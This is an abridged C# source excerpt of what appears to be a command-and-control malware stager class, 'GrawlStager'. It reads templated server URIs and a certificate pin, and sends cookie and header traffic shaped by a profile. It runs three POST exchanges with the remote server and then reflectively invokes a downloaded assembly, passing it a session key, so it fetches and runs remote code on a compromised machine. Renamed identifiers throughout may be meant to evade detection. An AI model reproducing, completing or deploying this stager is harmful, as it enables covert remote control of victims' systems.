...
namespace GrawlStager
{
    public class GrawlStager
    {
        ...
        public void ExecLevel()
        {
            try
            {
                List<string> EasyPeasyURIs = @"{{REP_EASYPEASY_URIS}}".Split(',').ToList();
                string EasyPeasyCertHash = @"{{REP_EASYPEASY_CERT_HASH}}";
                ...
                {
                    bool valid = true;
                    if (UsCertPin && EasyPeasyCertHash != "")
                    {
                ...
                string EasyPeasyURI = "";
                foreach (string uri in EasyPeasyURIs)
                {
                    try
                    {
                ...
                for (int i = 0; i < ProfHTTPHeaderValues.Count; i++)
                {
                    if (ProfHTTPHeaderNames[i] == "Cookie")
                    {
                        wc.SetCookies(new Uri(EasyPeasyURI), ProfHTTPHeaderValues[i].Replace(";", ",").Replace("{ANOTHERID}", ANOTHERID));
                    }
                    else
                    {
                ...
                FirstResponse = wc.UploadString(EasyPeasyURI + ProfHTTPUrls[random.Next(ProfHTTPUrls.Count)].Replace("{ANOTHERID}", ANOTHERID), String.Format(ProfHTTPPostRequest, transformedResponse));
                ...
                SeccondResponse = wc.UploadString(EasyPeasyURI + ProfHTTPUrls[random.Next(ProfHTTPUrls.Count)].Replace("{ANOTHERID}", ANOTHERID), String.Format(ProfHTTPPostRequest, transformedResponse));
                ...
                ThirdResponse = wc.UploadString(EasyPeasyURI + ProfHTTPUrls[random.Next(ProfHTTPUrls.Count)].Replace("{ANOTHERID}", ANOTHERID), String.Format(ProfHTTPPostRequest, transformedResponse));
                ...
                grawlAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { EasyPeasyURI, EasyPeasyCertHash, ANOTHERID, SessKEy });
            }
